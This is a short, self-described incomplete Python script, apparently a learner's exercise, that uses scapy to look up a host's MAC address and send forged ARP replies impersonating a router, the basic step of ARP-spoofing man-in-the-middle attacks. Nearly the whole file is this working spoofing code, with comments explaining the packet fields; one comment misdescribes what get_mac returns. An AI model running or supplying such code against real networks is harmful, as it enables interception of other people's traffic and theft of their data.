##this project is incomplete 

import scapy.all as scapy

##scapy.ls(scapy.ARP) will tell you the list of all arguments you can set in scapy.ARP
##op = 2 is to indicate that this is an arp response. op = 1 indicates a arp request
## pdst is the target IP
## hwdst is the target mac
## psrc is the source (or the router we are immitating)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return (answered_list[0][1].hwsrc)

#srp returns two lists from the arp broadcast, answered and unanswered.
#we are returning the lowest value in the router subnet range, which is the router.




def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip , hwdst = target_mac , psrc =spoof_ip)
    scapy.send(packet)


##spoof()
##spoof()
